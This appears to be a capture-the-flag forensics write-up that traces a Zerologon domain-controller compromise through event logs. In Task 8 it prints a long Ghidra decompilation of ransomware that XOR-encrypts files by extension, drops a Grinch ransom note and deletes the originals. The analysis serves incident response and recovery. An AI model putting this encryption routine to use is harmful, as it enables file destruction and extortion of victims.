# Sherlock Scenario
You'll notice a lot of our critical server infrastructure was recently transferred from the domain of our MSSP - Forela.local over to Northpole.local. We actually managed to purchase some second hand servers from the MSSP who have confirmed they are as secure as Christmas is! It seems not as we believe christmas is doomed and the attackers seemed to have the stealth of a clattering sleigh bell, or they didn’t want to hide at all!!!!!! We have found nasty notes from the Grinch on all of our TinkerTech workstations and servers! Christmas seems doomed. Please help us recover from whoever committed this naughty attack!

# Solution
## Task 1 
Question: Which CVE did the Threat Actor (TA) initially exploit to gain access to DC01?
<br>Answer: `CVE-2020-1472`

Using Hayabusa, the evtx directory can be scanned to determine the vulnerability using rules.

```
.\hayabusa-2.11.0-win-x64.exe csv-timeline -d 'C:\HTB\Optinseltrace\optinseltrace5\DC01.northpole.local-KAPE\uploads\auto\C%3A\Windows\System32\winevt' -o results.csv

╔╗ ╔╦═══╦╗  ╔╦═══╦══╗╔╗ ╔╦═══╦═══╗
║║ ║║╔═╗║╚╗╔╝║╔═╗║╔╗║║║ ║║╔═╗║╔═╗║
║╚═╝║║ ║╠╗╚╝╔╣║ ║║╚╝╚╣║ ║║╚══╣║ ║║
║╔═╗║╚═╝║╚╗╔╝║╚═╝║╔═╗║║ ║╠══╗║╚═╝║
║║ ║║╔═╗║ ║║ ║╔═╗║╚═╝║╚═╝║╚═╝║╔═╗║
╚╝ ╚╩╝ ╚╝ ╚╝ ╚╝ ╚╩═══╩═══╩═══╩╝ ╚╝
   by Yamato Security

Start time: 2023/12/29 14:41

Total event log files: 146
Total file size: 261.4 MB

Scan wizard:

✔ Which set of detection rules would you like to load? · 5. All event and alert rules (4270 rules) ( status: * | level: informational+ )
✔ Include deprecated rules? (193 rules) · no
✔ Include unsupported rules? (45 rules) · no
✔ Include noisy rules? (12 rules) · no
✔ Include sysmon rules? (2083 rules) · yes

```

![win1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/98d66849-9602-4023-ba86-26881401ebc6)

Hayabusa mentioned that most critical events happened on 13/12/2022. So I used Timeline Explorer to analyze the csv file from Hayabusa and found a suspicious logon from an unknown user (192.168.68.200) using an exploit called Zerologon.

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/fcc482fe-5133-4a57-9603-bda9ba046a52)

Scrolling further down, the unknown user seems to perform Mimikatz DC Sync multiple times. So I googled it to confirm if it's related to Zerologon and it does!

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/c3d0d8de-3535-469d-888f-0d64a8f4aa76)

![win2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/0ebb55bd-a1e0-4838-aff4-14f41c07d7f6)

## Task 2 
Question: What time did the TA initially exploit the CVE? (UTC)
<br>Answer: `2023-12-13 09:24:23`

Reading this [blog](https://0xbandar.medium.com/detecting-the-cve-2020-1472-zerologon-attacks-6f6ec0730a9e) about the CVE, it mentioned an easy way to detect the exploit using the Security.evtx.

> Successful exploitation resulting in a rest of the computer account password and it will be shown in security logs with event id 4742 “A computer account was changed”, password last set change, performed by Anonymous Logon.

![win2 1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/8307d503-2500-485b-9f84-9f20da3d1fed)

## Task 3
Question: What is the name of the executable related to the unusual service installed on the system around the time of the CVE exploitation?
<br>Answer: `hAvbdksT.exe`

Since we know the exact timeline for IoC, the executable related to the "vulnerable_to_zerologon" service can be easily found in the System.evtx by filtering the time and eventID.

![win3](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/e54e82e9-45ae-4e87-b078-7484cfeb94d0)

## Task 4 
Question: What date & time was the unusual service start?
<br>Answer: `2023-12-13 09:24:24`

Similar to Task 3, just look for "vulnerable_to_zerologon" service starting.

![win4](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/6dc67f43-deb9-487f-bdd1-4f8b53488d6b)

## Task 5 
Question: What was the TA's IP address within our internal network?
<br>Answer: `192.168.68.200`

Similar to Task 1, the TA's IP address can be identified from the malicious activity.

## Task 6 
Question: Please list all user accounts the TA utilised during their access. (Ascending order)
<br>Answer: `Administrator, Bytesparkle`

Using Hayabusa, we can find out the logon attempts and since we already know the TA's IP address from Task 5, we just have to find the user accounts. So I just filter out the specific IP address to find the second user.

```
.\hayabusa-2.11.0-win-x64.exe logon-summary -d 'C:\HTB\Optinseltrace\optinseltrace5\DC01.northpole.local-KAPE\uploads\auto\C%3A\Windows\System32\winevt\Logs | Select-String 192.168.68.200'
```

![win6](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/676b3958-cdf9-4c7e-9a14-0a66b0fd443a)

To confirm this, we can refer back to Timeline Explorer to analyze the IP address connections.

![image](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/ca59b54b-645e-4024-b962-cef531f01963)

## Task 7 
Question: What was the name of the scheduled task created by the TA?
<br>Answer: `svc_vnc`

Just look for the Microsoft-Windows-TaskScheduler%254Operational.evtx file and filter by eventID 106 (Task registered). Two schedule tasks was created and one of them was suspicious.

![win7](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/f517c46e-1397-4c9d-9741-706dc1b7a367)

## Task 8 
Question: Santa's memory is a little bad recently! He tends to write a lot of stuff down, but all our critical files have been encrypted! Which creature is Santa's new sleigh design planning to use?
<br>Answer: `Unicorn`

Initially, we were given several encrypted files and the encryption program (splunk_svc.dll). So it is obvious we have to perform reverse engineering on splunk_svc.dll to decrypt the files. Using ghidra, I managed to find the malware function that encrypted the files (FUN_180001330).

<details>
<summary>
FUN_180001330
</summary>

```
/* WARNING: Function: _alloca_probe replaced with injection: alloca_probe */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_180001330(char *param_1)

{
  undefined4 *_Dst;
  char cVar1;
  undefined8 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined8 *puVar13;
  undefined4 *puVar14;
  BOOL BVar15;
  int iVar16;
  undefined4 uVar17;
  uint uVar18;
  undefined4 *_Memory;
  ulonglong uVar19;
  char *pcVar20;
  FILE *_File;
  FILE *_File_00;
  undefined4 *puVar21;
  undefined2 uVar22;
  undefined *puVar23;
  longlong lVar24;
  undefined8 *puVar25;
  undefined2 *puVar26;
  FILE *pFVar27;
  undefined4 *puVar28;
  longlong lVar29;
  undefined4 *puVar30;
  wchar_t *_Src;
  longlong lVar31;
  undefined auStackY_1130 [32];
  char *local_10e0 [69];
  char *local_eb8;
  undefined4 local_ea8;
  undefined2 local_ea4;
  undefined local_e80 [8];
  char local_e78 [799];
  undefined uStack_b59;
  char local_b58 [799];
  undefined8 uStack_839;
  undefined2 uStack_729;
  undefined4 local_338 [192];
  ulonglong local_38;
  
  local_38 = DAT_180005008 ^ (ulonglong)auStackY_1130;
  local_10e0[0] = ".3ds";
  local_10e0[1] = &DAT_18000353c;
  local_10e0[2] = &DAT_180003544;
  local_10e0[3] = &DAT_18000354c;
  local_10e0[4] = &DAT_180003554;
  local_10e0[5] = &DAT_18000355c;
  local_10e0[7] = &DAT_180003560;
  local_10e0[8] = &DAT_180003564;
  local_10e0[9] = &DAT_18000356c;
  local_10e0[10] = &DAT_180003574;
  local_10e0[11] = &DAT_180003578;
  local_10e0[12] = &DAT_180003580;
  local_10e0[13] = &DAT_180003588;
  local_10e0[14] = &DAT_18000358c;
  local_10e0[15] = &DAT_180003594;
  local_10e0[16] = &DAT_18000359c;
  local_10e0[17] = &DAT_1800035a4;
  local_10e0[18] = &DAT_1800035ac;
  local_10e0[19] = &DAT_1800035b4;
  local_10e0[20] = &DAT_1800035bc;
  local_10e0[21] = &DAT_1800035c0;
  local_10e0[22] = &DAT_1800035c4;
  local_10e0[23] = &DAT_1800035cc;
  local_10e0[24] = &DAT_1800035d4;
  local_10e0[25] = &DAT_1800035dc;
  local_10e0[26] = &DAT_1800035e4;
  local_10e0[27] = &DAT_1800035ec;
  local_10e0[28] = &DAT_1800035f4;
  local_10e0[29] = &DAT_1800035fc;
  local_10e0[30] = &DAT_180003604;
  local_10e0[31] = &DAT_18000360c;
  local_10e0[32] = &DAT_180003614;
  local_10e0[33] = &DAT_18000361c;
  local_10e0[34] = &DAT_180003624;
  local_10e0[35] = &DAT_18000362c;
  local_10e0[36] = &DAT_180003634;
  local_10e0[37] = &DAT_180003638;
  local_10e0[38] = &DAT_180003640;
  local_10e0[39] = &DAT_180003648;
  local_10e0[40] = &DAT_180003650;
  local_10e0[41] = &DAT_180003658;
  local_10e0[42] = &DAT_180003660;
  local_10e0[43] = &DAT_180003668;
  local_10e0[44] = &DAT_180003670;
  local_10e0[45] = &DAT_180003678;
  local_10e0[46] = &DAT_180003680;
  local_10e0[47] = &DAT_180003688;
  local_10e0[48] = &DAT_180003690;
  local_10e0[49] = &DAT_180003698;
  local_10e0[50] = &DAT_1800036a0;
  local_10e0[51] = &DAT_1800036a8;
  local_10e0[52] = &DAT_1800036b0;
  local_10e0[53] = ".accdb";
  local_10e0[54] = ".aspx";
  local_10e0[55] = ".avhd";
  local_10e0[56] = ".back";
  local_10e0[57] = ".conf";
  local_10e0[58] = ".disk";
  local_10e0[59] = ".djvu";
  local_10e0[60] = ".docx";
  local_10e0[61] = ".kdbx";
  local_10e0[62] = ".mail";
  local_10e0[63] = ".pptx";
  local_10e0[64] = ".vbox";
  local_10e0[65] = ".vmdk";
  local_10e0[66] = ".vmsd";
  local_10e0[67] = ".vsdx";
  local_10e0[68] = ".work";
  local_eb8 = ".xlsx";
  _Memory = (undefined4 *)FUN_1800010f0(param_1);
  if (_Memory == (undefined4 *)0x0) {
LAB_180001ca6:
    __security_check_cookie(local_38 ^ (ulonglong)auStackY_1130);
    return;
  }
LAB_180001710:
  lVar31 = *(longlong *)(_Memory + 0x4a);
  if (*(int *)(lVar31 + 0x478) == 0) {
    if (*(HANDLE *)(lVar31 + 0x480) == (HANDLE)0xffffffffffffffff) goto LAB_180001c5e;
    BVar15 = FindNextFileW(*(HANDLE *)(lVar31 + 0x480),(LPWIN32_FIND_DATAW)(lVar31 + 0x228));
    if (BVar15 == 0) {
      FindClose(*(HANDLE *)(lVar31 + 0x480));
      *(undefined8 *)(lVar31 + 0x480) = 0xffffffffffffffff;
LAB_180001c5e:
      FUN_180001080(*(void **)(_Memory + 0x4a));
      *(undefined8 *)(_Memory + 0x4a) = 0;
      free(_Memory);
      goto LAB_180001ca6;
    }
  }
  else {
    *(undefined4 *)(lVar31 + 0x478) = 0;
  }
  if ((uint *)(lVar31 + 0x228) == (uint *)0x0) goto LAB_180001c5e;
  _Dst = _Memory + 7;
  _Src = (wchar_t *)(lVar31 + 0x254);
  iVar16 = wcstombs_s((size_t *)local_e80,(char *)_Dst,0x105,_Src,0x105);
  if (iVar16 == 0) {
LAB_1800017c6:
    *(size_t *)(_Memory + 4) = (longlong)local_e80 - 1;
    uVar18 = *(uint *)(lVar31 + 0x228);
    if ((uVar18 & 0x40) == 0) {
      uVar22 = 0x128;
      uVar17 = 0x8000;
      if ((uVar18 & 0x10) != 0) {
        uVar17 = 0x4000;
      }
      _Memory[6] = uVar17;
      uVar17 = 0;
    }
    else {
      _Memory[6] = 0x2000;
      uVar22 = 0x128;
      uVar17 = 0;
    }
  }
  else {
    _Src = (wchar_t *)(lVar31 + 0x45c);
    if (*_Src != L'\0') {
      iVar16 = wcstombs_s((size_t *)local_e80,(char *)_Dst,0x105,_Src,0x105);
    }
    if (iVar16 == 0) goto LAB_1800017c6;
    *(undefined *)_Dst = 0x3f;
    uVar22 = 0;
    *(undefined *)((longlong)_Memory + 0x1d) = 0;
    uVar17 = 0xffffffff;
    *(undefined8 *)(_Memory + 4) = 1;
    _Memory[6] = 0;
  }
  *_Memory = 0;
  _Memory[1] = uVar17;
  uVar19 = 0xffffffffffffffff;
  *(undefined2 *)(_Memory + 2) = uVar22;
  do {
    uVar19 = uVar19 + 1;
  } while (param_1[uVar19] != '\0');
  if (((uVar19 < 1000) && ((*(char *)_Dst != '.' || (*(char *)((longlong)_Memory + 0x1d) != '\0'))))
     && ((*(char *)_Dst != '.' ||
         ((*(char *)((longlong)_Memory + 0x1d) != '.' ||
          (*(char *)((longlong)_Memory + 0x1e) != '\0')))))) {
    lVar31 = 0;
    do {
      pcVar20 = strstr((char *)_Dst,local_10e0[lVar31]);
      if (pcVar20 != (char *)0x0) {
        local_ea8 = 0x616d782e;
        local_ea4 = 0x78;
        pcVar20 = param_1;
        do {
          cVar1 = *pcVar20;
          pcVar20[(longlong)(local_e78 + -(longlong)param_1)] = cVar1;
          pcVar20 = pcVar20 + 1;
        } while (cVar1 != '\0');
        puVar26 = (undefined2 *)(local_e80 + 7);
        do {
          pcVar20 = (char *)((longlong)puVar26 + 1);
          puVar26 = (undefined2 *)((longlong)puVar26 + 1);
        } while (*pcVar20 != '\0');
        *puVar26 = 0x5c;
        puVar23 = local_e80 + 7;
        do {
          pcVar20 = puVar23 + 1;
          puVar23 = puVar23 + 1;
        } while (*pcVar20 != '\0');
        lVar24 = 0;
        do {
          cVar1 = *(char *)((longlong)_Dst + lVar24);
          puVar23[lVar24] = cVar1;
          lVar24 = lVar24 + 1;
        } while (cVar1 != '\0');
        lVar24 = 0;
        do {
          pcVar20 = local_e78 + lVar24;
          local_b58[lVar24] = *pcVar20;
          lVar24 = lVar24 + 1;
        } while (*pcVar20 != '\0');
        puVar23 = &uStack_b59;
        do {
          pcVar20 = puVar23 + 1;
          puVar23 = puVar23 + 1;
        } while (*pcVar20 != '\0');
        puVar30 = &local_ea8;
        lVar24 = 0;
        do {
          cVar1 = *(char *)((longlong)puVar30 + lVar24);
          puVar23[lVar24] = cVar1;
          lVar24 = lVar24 + 1;
        } while (cVar1 != '\0');
        FUN_180001020(&DAT_180003754,local_b58,puVar30,_Src);
        pFVar27 = (FILE *)&DAT_180003208;
        _File = fopen(local_e78,"rb");
        if (_File == (FILE *)0x0) {
LAB_180001a69:
          FUN_180001020("\nXOR operation failed!",pFVar27,puVar30,_Src);
        }
        else {
          pFVar27 = (FILE *)&DAT_18000320c;
          _File_00 = fopen(local_b58,"wb");
          if (_File_00 == (FILE *)0x0) goto LAB_180001a69;
          lVar24 = 0;
          while( true ) {
            lVar29 = 0;
            if (lVar24 < 0x10) {
              lVar29 = lVar24;
            }
            uVar18 = fgetc(_File);
            lVar24 = lVar29 + 1;
            if (uVar18 == 0xffffffff) break;
            pFVar27 = _File_00;
            fputc((int)"EncryptingC4Fun!"[lVar29] ^ uVar18,_File_00);
          }
          iVar16 = fclose(_File);
          if ((iVar16 != 0) || (iVar16 = fclose(_File_00), iVar16 != 0)) goto LAB_180001a69;
        }
        _DAT_180005628 = _DAT_180005628 + 1;
        _Src = (wchar_t *)0x0;
        SHGetSpecialFolderPathA((HWND)0x0,(LPSTR)((longlong)&uStack_839 + 1),0,0);
        lVar24 = 5;
        puVar30 = (undefined4 *)
                  "Dear Santa Claus,\n\nIt\'s time for a holiday twist you didn\'t see coming. Yours  truly, the Grinch, has taken over your Christmas operation. Not only have I got m y hands on your list of gift recipients, but I also hold the infamous Naughty List . The world is on the edge of discovering who\'s been less than angelic this year! \n\nTo keep Christmas from turning into a scandal, I demand a ransom of 5,000,000 XMAS tokens. Deposit them into my crypto wallet: GR1NCH-5ANTA-2023XMAS. Delay or n on-compliance will lead to the Naughty List becoming public knowledge, destroying the festive spirit across the globe.\n\nTick tock, Santa. The deadline is midnight  on Christmas Eve. Make the right choice. Together, we can still save Christmas.\n \nSinister holiday wishes,\nThe Grinch"
        ;
        puVar14 = local_338;
        do {
          puVar28 = puVar14;
          puVar21 = puVar30;
          uVar17 = puVar21[1];
          uVar3 = puVar21[2];
          uVar4 = puVar21[3];
          uVar5 = puVar21[4];
          uVar6 = puVar21[5];
          uVar7 = puVar21[6];
          uVar8 = puVar21[7];
          *puVar28 = *puVar21;
          puVar28[1] = uVar17;
          puVar28[2] = uVar3;
          puVar28[3] = uVar4;
          uVar17 = puVar21[8];
          uVar3 = puVar21[9];
          uVar4 = puVar21[10];
          uVar9 = puVar21[0xb];
          puVar28[4] = uVar5;
          puVar28[5] = uVar6;
          puVar28[6] = uVar7;
          puVar28[7] = uVar8;
          uVar5 = puVar21[0xc];
          uVar6 = puVar21[0xd];
          uVar7 = puVar21[0xe];
          uVar8 = puVar21[0xf];
          puVar28[8] = uVar17;
          puVar28[9] = uVar3;
          puVar28[10] = uVar4;
          puVar28[0xb] = uVar9;
          uVar17 = puVar21[0x10];
          uVar3 = puVar21[0x11];
          uVar4 = puVar21[0x12];
          uVar9 = puVar21[0x13];
          puVar28[0xc] = uVar5;
          puVar28[0xd] = uVar6;
          puVar28[0xe] = uVar7;
          puVar28[0xf] = uVar8;
          uVar5 = puVar21[0x14];
          uVar6 = puVar21[0x15];
          uVar7 = puVar21[0x16];
          uVar8 = puVar21[0x17];
          puVar28[0x10] = uVar17;
          puVar28[0x11] = uVar3;
          puVar28[0x12] = uVar4;
          puVar28[0x13] = uVar9;
          uVar17 = puVar21[0x18];
          uVar3 = puVar21[0x19];
          uVar4 = puVar21[0x1a];
          uVar9 = puVar21[0x1b];
          puVar28[0x14] = uVar5;
          puVar28[0x15] = uVar6;
          puVar28[0x16] = uVar7;
          puVar28[0x17] = uVar8;
          uVar5 = puVar21[0x1c];
          uVar6 = puVar21[0x1d];
          uVar7 = puVar21[0x1e];
          uVar8 = puVar21[0x1f];
          puVar28[0x18] = uVar17;
          puVar28[0x19] = uVar3;
          puVar28[0x1a] = uVar4;
          puVar28[0x1b] = uVar9;
          puVar28[0x1c] = uVar5;
          puVar28[0x1d] = uVar6;
          puVar28[0x1e] = uVar7;
          puVar28[0x1f] = uVar8;
          lVar24 = lVar24 + -1;
          puVar30 = puVar21 + 0x20;
          puVar14 = puVar28 + 0x20;
        } while (lVar24 != 0);
        uVar2 = *(undefined8 *)(puVar21 + 0x3c);
        uVar17 = puVar21[0x21];
        uVar3 = puVar21[0x22];
        uVar4 = puVar21[0x23];
        uVar5 = puVar21[0x24];
        uVar6 = puVar21[0x25];
        uVar7 = puVar21[0x26];
        uVar8 = puVar21[0x27];
        puVar28[0x20] = puVar21[0x20];
        puVar28[0x21] = uVar17;
        puVar28[0x22] = uVar3;
        puVar28[0x23] = uVar4;
        uVar17 = puVar21[0x28];
        uVar3 = puVar21[0x29];
        uVar4 = puVar21[0x2a];
        uVar9 = puVar21[0x2b];
        puVar28[0x24] = uVar5;
        puVar28[0x25] = uVar6;
        puVar28[0x26] = uVar7;
        puVar28[0x27] = uVar8;
        uVar5 = puVar21[0x2c];
        uVar6 = puVar21[0x2d];
        uVar7 = puVar21[0x2e];
        uVar8 = puVar21[0x2f];
        puVar28[0x28] = uVar17;
        puVar28[0x29] = uVar3;
        puVar28[0x2a] = uVar4;
        puVar28[0x2b] = uVar9;
        uVar9 = puVar21[0x30];
        uVar10 = puVar21[0x31];
        uVar11 = puVar21[0x32];
        uVar12 = puVar21[0x33];
        puVar28[0x2c] = uVar5;
        puVar28[0x2d] = uVar6;
        puVar28[0x2e] = uVar7;
        puVar28[0x2f] = uVar8;
        uVar17 = puVar21[0x34];
        uVar3 = puVar21[0x35];
        uVar4 = puVar21[0x36];
        uVar5 = puVar21[0x37];
        puVar28[0x30] = uVar9;
        puVar28[0x31] = uVar10;
        puVar28[0x32] = uVar11;
        puVar28[0x33] = uVar12;
        uVar6 = puVar21[0x38];
        uVar7 = puVar21[0x39];
        uVar8 = puVar21[0x3a];
        uVar9 = puVar21[0x3b];
        puVar28[0x34] = uVar17;
        puVar28[0x35] = uVar3;
        puVar28[0x36] = uVar4;
        puVar28[0x37] = uVar5;
        puVar28[0x38] = uVar6;
        puVar28[0x39] = uVar7;
        puVar28[0x3a] = uVar8;
        puVar28[0x3b] = uVar9;
        *(undefined8 *)(puVar28 + 0x3c) = uVar2;
        puVar28[0x3e] = puVar21[0x3e];
        puVar13 = &uStack_839;
        do {
          puVar25 = puVar13;
          puVar13 = (undefined8 *)((longlong)puVar25 + 1);
        } while (*(char *)((longlong)puVar25 + 1) != '\0');
        *(undefined8 *)((longlong)puVar25 + 1) = 0x2e454d444145525c;
        *(undefined4 *)((longlong)puVar25 + 9) = 0x545854;
        pFVar27 = fopen((char *)((longlong)&uStack_839 + 1),"w");
        fputs((char *)local_338,pFVar27);
        fclose(pFVar27);
        remove(local_e78);
      }
      lVar31 = lVar31 + 1;
    } while (lVar31 < 0x45);
    pcVar20 = param_1;
    do {
      cVar1 = *pcVar20;
      pcVar20[(longlong)&uStack_729 + (1 - (longlong)param_1)] = cVar1;
      pcVar20 = pcVar20 + 1;
    } while (cVar1 != '\0');
    puVar26 = &uStack_729;
    do {
      pcVar20 = (char *)((longlong)puVar26 + 1);
      puVar26 = (undefined2 *)((longlong)puVar26 + 1);
    } while (*pcVar20 != '\0');
    *puVar26 = 0x5c;
    puVar26 = &uStack_729;
    do {
      pcVar20 = (char *)((longlong)puVar26 + 1);
      puVar26 = (undefined2 *)((longlong)puVar26 + 1);
    } while (*pcVar20 != '\0');
    lVar31 = 0;
    do {
      cVar1 = *(char *)((longlong)_Dst + lVar31);
      *(char *)((longlong)puVar26 + lVar31) = cVar1;
      lVar31 = lVar31 + 1;
    } while (cVar1 != '\0');
    FUN_180001330((char *)((longlong)&uStack_729 + 1));
  }
  goto LAB_180001710;
}
```

</details>

Analyzing the function, the encryption method was discovered to be a simple XOR with the key "EncryptingC4Fun!". So we can use CyberChef to decrypt the files easily and discover Santa' plan.

![win8](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/a665d12f-a6a4-46cd-8463-bf0f89f06fe7)

![win8 1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/fbb5dac6-a162-421f-891b-63dcfd1c6267)

![win8 2](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/4137037d-0797-4c1e-919b-7be3bded88b2)

## Task 9 
Question: Please confirm the process ID of the process that encrypted our files.
<br>Answer: `5828`

Using the output from EVTXCmd and Timeline Explorer, we can filter by the file extension of encrypted files (.xmax) and discover that they were stored in the Microsoft-Windows-UAC-FileVirtualization/Operational channel. Hence, we can analyze the Microsoft-Windows-UAC-FileVirtualization/Operational.evtx file to obtain the process ID.

![win9](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/c1c564be-85e9-4850-9c1b-34527c3094d2)

![win9 1](https://github.com/warlocksmurf/HTB-writeups/assets/121353711/7c5b26f8-53db-4cef-af70-f228c2ccd7c7)
